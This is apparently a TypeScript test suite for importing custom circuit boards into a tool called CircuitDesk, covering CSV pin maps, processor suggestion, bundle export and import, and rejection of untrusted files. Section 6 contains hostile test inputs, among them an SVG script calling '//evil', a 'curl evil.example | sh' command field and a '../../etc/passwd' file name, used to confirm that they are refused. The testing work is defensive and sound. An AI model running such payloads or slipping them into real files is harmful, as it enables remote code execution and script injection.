// Bringing a board in: the pin map, the bundle, and what nobody may guess.
//
// The flagship workflow this has to make work is two files and one question:
// a CSV of pin names and pads, an SVG of the board's face, and "which chip is
// on it?" — asked, never assumed. A pad table says where the copper is, not
// what is soldered to it, and a board silently compiled for the wrong processor
// fails a long way from the import that caused it.
//
// So the claims here are:
//   1. a two-column CSV is enough to start, and bad rows are REPORTED rather
//      than dropped, with the row number and the reason;
//   2. a processor is suggested with its evidence and never assigned;
//   3. a board bundle round-trips exactly, carries no path from the machine
//      that wrote it, and is refused when it is not what it says it is;
//   4. the capability table matches what the importers can actually do.

import { pinsFromCsv, suggestProcessors, suggestedPipeline, boardFromImport } from '../src/custom-boards/import';
import { exportBoardBundle, importBoardBundle, duplicateBoard, bundleFileName, BUNDLE_KIND } from '../src/custom-boards/bundle';
import { IMPORT_CAPABILITIES, importCapability } from '../src/custom-boards/importCapabilities';
import { validateCustomBoard, isError } from '../src/custom-boards/validate';
import { resolveCustomBoard } from '../src/custom-boards/resolve';
import { CUSTOM_BOARD_LIMITS, type CustomBoardDefinition } from '../src/custom-boards/schema';

let failures = 0;
function check(cond: boolean, msg: string) {
  console.log(cond ? 'PASS:' : 'FAIL:', msg);
  if (!cond) failures++;
}
function section(t: string) {
  console.log(`\n--- ${t}`);
}

const csv = (text: string): { headers: string[]; rows: string[][] } => {
  const lines = text.trim().split('\n').map((l) => l.split(',').map((c) => c.trim()));
  return { headers: lines[0], rows: lines.slice(1) };
};

// ============================== 1. the two-column CSV that has to work ======
section('1. a pin map with two columns is enough to start');
{
  const { headers, rows } = csv(`
label,processor_pin
STATUS_LED,GP15
BUTTON,GP16
SDA,GP4
SCL,GP5
`);
  const result = pinsFromCsv(headers, rows, 'proc.rp2040');
  check(result.errors.length === 0, `it is read without errors${result.errors.map((e) => ` — row ${e.row}: ${e.message}`).join('')}`);
  check(result.pins.length === 4, `and produces four pins (${result.pins.length})`);
  check(result.pins[0].label === 'STATUS_LED', 'with the maker\'s own labels');
  check(result.pins[0].pad === 'GP15', 'mapped to the pads the file named');
  check(result.pins[0].id === 'STATUS_LED', 'and a stable id derived from the label');
  check(
    result.warnings.some((w) => /no coordinates/i.test(w)),
    'and it says the pins were stacked for placing',
  );
  check(result.pins[1].yMm > result.pins[0].yMm, 'which they were, down the edge');

  // Case is a spreadsheet's business, not the user's.
  const lower = pinsFromCsv(...Object.values(csv('label,gpio\nLED,gp15\n')) as [string[], string[][]], 'proc.rp2040');
  check(lower.pins[0]?.pad === 'GP15', `a lower-case pad is matched and stored in the chip's spelling (${lower.pins[0]?.pad})`);
}

// ================================ 2. bad rows are reported, not dropped =====
section('2. a row that cannot be read says which row and why');
{
  const { headers, rows } = csv(`
label,processor_pin
STATUS,GP15
BAD,GP31
ALSO_BAD,GP99
GOOD,GP2
`);
  const result = pinsFromCsv(headers, rows, 'proc.rp2040');
  check(result.errors.length === 2, `two rows are reported (${result.errors.length})`);
  const first = result.errors[0];
  // Row 1 is the header, so the first bad data row is row 3.
  check(first.row === 3, `by their spreadsheet row number (${first.row})`);
  check(
    /GP31/.test(first.message) && /RP2040/.test(first.message) && /GP0-GP29/.test(first.message),
    `naming the pad, the chip and the range ("${first.message}")`,
  );
  // The good rows still come through: an import that refuses everything because
  // of one bad row is an import nobody finishes.
  check(result.pins.length === 4, `and the readable rows are still imported (${result.pins.length})`);
  check(result.pins.find((p) => p.label === 'BAD')?.pad === null, 'with the bad mapping left unset rather than wrong');

  const noLabel = pinsFromCsv(['x', 'y'], [['1', '2']], 'proc.rp2040');
  check(
    noLabel.errors.some((e) => /label/.test(e.message)),
    'a file with no label column is refused with a message about the columns',
  );

  const shared = pinsFromCsv(...Object.values(csv('label,pad\nA,GP2\nB,GP2\n')) as [string[], string[][]], 'proc.rp2040');
  check(
    shared.warnings.some((w) => /both map to GP2/.test(w)),
    'two rows on one pad is a warning, not a silent merge',
  );

  const tooMany = pinsFromCsv(
    ['label'],
    Array.from({ length: CUSTOM_BOARD_LIMITS.maxPins + 10 }, (_, i) => [`P${i}`]),
    null,
  );
  check(
    tooMany.errors.some((e) => /more than/.test(e.message)),
    'and a file with too many rows says so rather than truncating quietly',
  );
}

// ================================= 3. the processor is asked, not assumed ===
section('3. a processor is suggested with its evidence');
{
  const named = suggestProcessors('(module RP2040_QFN56 (layer F.Cu) ...)');
  check(named.length === 1, `a file naming the chip produces one candidate (${named.length})`);
  check(named[0]?.processorProfileId === 'proc.rp2040', 'the right one');
  check(named[0]?.confidence === 'unambiguous', 'with high confidence');
  check(/rp2040/i.test(named[0]?.evidence ?? ''), `quoting what it found ("${named[0]?.evidence}")`);

  const two = suggestProcessors('ATmega328P and also ESP32-C6 appear in this netlist');
  check(two.length === 2, `an ambiguous file produces both candidates (${two.length})`);

  // Pad names alone are weak evidence and must not masquerade as strong.
  const byPads = suggestProcessors('no part numbers here', ['GP0', 'GP1', 'GP2', 'GP15', 'GP16']);
  check(byPads[0]?.confidence === 'likely', `pin names alone are only "likely" (${byPads[0]?.confidence})`);
  check(/pin names match/.test(byPads[0]?.evidence ?? ''), 'and say so');

  const nothing = suggestProcessors('a board with no identifying marks');
  check(nothing.length === 0, 'a file that says nothing produces no suggestion');

  // The import itself never applies one.
  const imported = boardFromImport({ name: 'Imported', widthMm: 30, heightMm: 40, pins: [] });
  check(imported.processorProfileId === null, 'an import with no confirmed processor produces a wiring-only board');
  check(imported.compileProfileId === 'compile.none', 'with no toolchain');
  check(imported.runtimeProfileId === 'runtime.none', 'and no runtime');

  const confirmed = boardFromImport({
    name: 'Imported', widthMm: 30, heightMm: 40, pins: [], processorProfileId: 'proc.rp2040',
  });
  check(confirmed.compileProfileId === 'compile.rp2040-arduino', 'and once confirmed, the pipeline follows');
  check(confirmed.runtimeProfileId === 'runtime.rp2040js', 'both halves of it');
}

// ============================= 4. Simple Mode picks the known-good pipeline =
section('4. choosing a processor is all Simple Mode needs');
{
  for (const [processor, compile, runtime] of [
    ['proc.rp2040', 'compile.rp2040-arduino', 'runtime.rp2040js'],
    ['proc.atmega328p', 'compile.avr-arduino', 'runtime.avr8js-328p'],
    ['proc.atmega2560', 'compile.avr-arduino-mega', 'runtime.avr8js-2560'],
    ['proc.atmega32u4', 'compile.avr-arduino-32u4', 'runtime.avr8js-32u4'],
    ['proc.esp32c3', 'compile.esp32c3-arduino', 'runtime.esp32c3'],
    ['proc.esp32c6', 'compile.esp32c6-arduino', 'runtime.esp32c6'],
  ] as const) {
    const suggested = suggestedPipeline(processor);
    check(
      suggested.compileProfileId === compile && suggested.runtimeProfileId === runtime,
      `${processor} suggests ${suggested.compileProfileId} + ${suggested.runtimeProfileId}`,
    );
  }
  const none = suggestedPipeline(null);
  check(none.compileProfileId === 'compile.none' && none.runtimeProfileId === 'runtime.none', 'and no processor suggests neither');
}

// ================================ 5. the bundle round-trips exactly =========
section('5. a board file carries the board and nothing else');
{
  const board: CustomBoardDefinition = {
    schemaVersion: '1.0.0',
    id: 'custom.bundle-test',
    revision: 3,
    identity: { name: 'Sensor Controller', creator: 'A. Maker', description: 'For the greenhouse.' },
    outline: { widthMm: 36, heightMm: 52, color: '#123456', artworkSvg: '<svg><rect width="10" height="10" fill="#333"/></svg>' },
    pins: [
      { id: 'STATUS', label: 'STATUS', pad: 'GP15', xMm: 3, yMm: 6, type: 'digital', capabilities: [] },
      { id: 'SDA', label: 'SENSOR_SDA', pad: 'GP4', xMm: 33, yMm: 6, type: 'digital', capabilities: [], aliases: ['I2C_DATA'] },
      { id: 'GND', label: 'GND', pad: null, xMm: 3, yMm: 12, type: 'ground', capabilities: [] },
    ],
    processorProfileId: 'proc.rp2040',
    compileProfileId: 'compile.rp2040-arduino',
    runtimeProfileId: 'runtime.rp2040js',
    peripherals: [{ kind: 'i2c', controller: 'i2c0', pins: { sda: 'SDA' } }],
    metadata: { batch: '2026-A' },
  };

  const { json, problems } = exportBoardBundle(board);
  check(problems.filter(isError).length === 0, 'it exports without error');
  check(!/[A-Za-z]:\\|\/home\/|\/Users\//.test(json), 'and carries no path from this machine');
  check(json.includes(BUNDLE_KIND), 'the file says what it is');

  const { board: back, problems: importProblems } = importBoardBundle(json);
  check(importProblems.filter(isError).length === 0, `and imports back${importProblems.filter(isError).map((p) => ` — ${p.message}`).join('')}`);
  check(back !== undefined, 'producing a board');
  if (back) {
    check(back.id === board.id, 'with the same id');
    check(back.revision === 3, 'the same revision');
    check(back.identity.name === 'Sensor Controller', 'the same name');
    check(back.pins.length === 3, 'all its pins');
    check(back.pins.find((p) => p.id === 'SDA')?.pad === 'GP4', 'their pad mapping');
    check(back.pins.find((p) => p.id === 'SDA')?.aliases?.includes('I2C_DATA') === true, 'their aliases');
    check(back.outline.artworkSvg === board.outline.artworkSvg, 'its artwork');
    check(back.processorProfileId === 'proc.rp2040', 'its processor');
    check(back.compileProfileId === 'compile.rp2040-arduino', 'its toolchain');
    check(back.runtimeProfileId === 'runtime.rp2040js', 'and its runtime');
    check(back.peripherals?.[0]?.controller === 'i2c0', 'and its bus assignment');

    // The board it becomes is the board it was.
    const before = resolveCustomBoard(board).board;
    const after = resolveCustomBoard(back).board;
    check(after.pins.length === before.pins.length, 'and resolves to the same board');
    check(after.supportLevel === before.supportLevel, `with the same support level (${after.supportLevel})`);
  }

  check(bundleFileName(board) === 'sensor-controller.cdboard.json', `the file name is derived safely (${bundleFileName(board)})`);
  const nasty = bundleFileName({ ...board, identity: { name: '../../etc/passwd' } });
  check(!nasty.includes('/') && !nasty.includes('..'), `and a hostile name cannot climb out of a directory (${nasty})`);
}

// ============================= 6. a bundle is untrusted input ==============
section('6. a board file that is not one is refused, with a reason');
{
  const cases: [string, string, RegExp][] = [
    ['not JSON at all', 'this is not json', /not valid JSON/],
    ['an array', '[]', /must be a JSON object/],
    ['a different kind of file', '{"kind":"something-else"}', /not a CircuitDesk board file/],
    ['a future version', `{"kind":"${BUNDLE_KIND}","bundleVersion":99}`, /Update CircuitDesk/],
    ['an empty file', '', /empty/],
  ];
  for (const [what, text, pattern] of cases) {
    const { board, problems } = importBoardBundle(text);
    check(board === undefined, `${what} is refused`);
    check(problems.some((p) => pattern.test(p.message)), `  with a message that says why ("${problems[0]?.message.slice(0, 70)}")`);
  }

  // Oversized.
  const huge = JSON.stringify({ kind: BUNDLE_KIND, bundleVersion: 1, board: { pad: 'x'.repeat(2_000_000) } });
  check(
    importBoardBundle(huge).problems.some((p) => /limit is/.test(p.message)),
    'an oversized file is refused before it is parsed',
  );

  // Hostile artwork is refused at the bundle boundary, with the reason named.
  const scripted = JSON.stringify({
    kind: BUNDLE_KIND,
    bundleVersion: 1,
    board: {
      schemaVersion: '1.0.0', id: 'custom.x', revision: 1,
      identity: { name: 'Evil' },
      outline: { widthMm: 20, heightMm: 20, artworkSvg: '<svg><script>fetch("//evil")</script></svg>' },
      pins: [{ id: 'A', label: 'A', pad: null, xMm: 1, yMm: 1, type: 'digital', capabilities: [] }],
      processorProfileId: null, compileProfileId: 'compile.none', runtimeProfileId: 'runtime.none',
    },
  });
  const scriptResult = importBoardBundle(scripted);
  check(scriptResult.board === undefined, 'a bundle whose artwork contains a script is refused');
  check(
    scriptResult.problems.some((p) => /<script>/.test(p.message) && /drawing instructions/.test(p.message)),
    `and told exactly what was wrong ("${scriptResult.problems[0]?.message ?? ''}")`,
  );

  // A field that names a program does not survive into the board.
  const withCommand = JSON.stringify({
    kind: BUNDLE_KIND,
    bundleVersion: 1,
    board: {
      schemaVersion: '1.0.0', id: 'custom.y', revision: 1,
      identity: { name: 'Sneaky' },
      outline: { widthMm: 20, heightMm: 20 },
      pins: [{ id: 'A', label: 'A', pad: null, xMm: 1, yMm: 1, type: 'digital', capabilities: [] }],
      processorProfileId: null, compileProfileId: 'compile.none', runtimeProfileId: 'runtime.none',
      compileCommand: 'curl evil.example | sh',
      runtimeCode: 'globalThis.fetch("//evil")',
    },
  });
  const sneaky = importBoardBundle(withCommand);
  check(sneaky.board !== undefined, 'a bundle with invented fields still imports on the fields that exist');
  check(
    sneaky.board !== undefined && !JSON.stringify(sneaky.board).includes('curl'),
    'and the invented command is not in the board',
  );
  check(
    sneaky.board !== undefined && !JSON.stringify(sneaky.board).includes('globalThis'),
    'nor the invented code',
  );
}

// ================================= 7. duplicating gives a new identity ======
section('7. a duplicate is a new board, not a second copy of one');
{
  const original: CustomBoardDefinition = {
    schemaVersion: '1.0.0', id: 'custom.original', revision: 4,
    identity: { name: 'Controller' },
    outline: { widthMm: 30, heightMm: 40 },
    pins: [{ id: 'A', label: 'A', pad: 'GP1', xMm: 2, yMm: 4, type: 'digital', capabilities: [] }],
    processorProfileId: 'proc.rp2040',
    compileProfileId: 'compile.rp2040-arduino',
    runtimeProfileId: 'runtime.rp2040js',
  };
  const copy = duplicateBoard(original, 'Controller (copy)');
  check(copy.id !== original.id, 'the copy has its own id');
  check(copy.revision === 1, `and starts at revision 1 (${copy.revision})`);
  check(copy.identity.name === 'Controller (copy)', 'with its own name');
  check(copy.pins.length === original.pins.length, 'and the same pins');
  check(validateCustomBoard(copy).problems.filter(isError).length === 0, 'and it is a valid board');
}

// ============================ 8. the capability table is honest ============
section('8. every importer is classified by what it actually produces');
{
  check(IMPORT_CAPABILITIES.length >= 9, `every format is classified (${IMPORT_CAPABILITIES.length})`);
  for (const capability of IMPORT_CAPABILITIES) {
    check(capability.produces.length > 20, `${capability.format}: says what it produces`);
    if (capability.level !== 'complete') {
      check(Boolean(capability.limitation), `${capability.format}: and what it does not`);
    }
  }

  // Gerber is the one that must not claim pins: a flashed pad is not
  // distinguishable from a via or a fiducial.
  const gerber = importCapability('gerber')!;
  check(gerber.level === 'visual-only', `Gerber is visual reference only (${gerber.level})`);
  check(/manufacturing, not connectivity/.test(gerber.limitation ?? ''), 'and says why');

  // And SVG must not claim pins either.
  check(importCapability('svg')?.level === 'artwork-only', 'SVG is artwork only');
  check(importCapability('cdboard')?.level === 'complete', 'the board file is the complete one');
  check(importCapability('csv')?.level === 'pins-geometry', 'CSV brings pins but not a processor');

  // Nothing claims to determine the processor, because nothing can.
  for (const capability of IMPORT_CAPABILITIES) {
    if (capability.format === 'cdboard' || capability.format === 'circuitdesk') continue;
    check(
      !/\bdetermines the processor\b|\bsets the processor\b/i.test(capability.produces),
      `${capability.format}: does not claim to decide the processor`,
    );
  }
}

console.log(
  failures === 0
    ? '\nCustom board import checks passed.'
    : `\n${failures} check(s) FAILED`,
);
process.exit(failures === 0 ? 0 : 1);
